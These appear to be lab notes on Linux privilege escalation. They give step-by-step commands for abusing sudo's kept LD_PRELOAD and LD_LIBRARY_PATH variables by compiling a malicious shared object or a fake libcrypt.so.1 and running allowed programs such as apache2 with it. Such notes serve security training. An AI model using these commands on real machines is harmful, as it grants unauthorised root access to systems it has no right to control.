
LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first


Create a shared object using the code located at /home/user/tools/sudo/preload.c:

`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`

Run one of the programs you are allowed to run via sudo (listed when running **sudo -l**), while setting the LD_PRELOAD environment variable to the full path of the new shared object:

`sudo LD_PRELOAD=/tmp/preload.so program-name-here`


# LD preload 


Run ldd against the apache2 program file to see which shared libraries are used by the program:

`ldd /usr/sbin/apache2`

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:

`gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`

Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):

`sudo LD_LIBRARY_PATH=/tmp apache2`
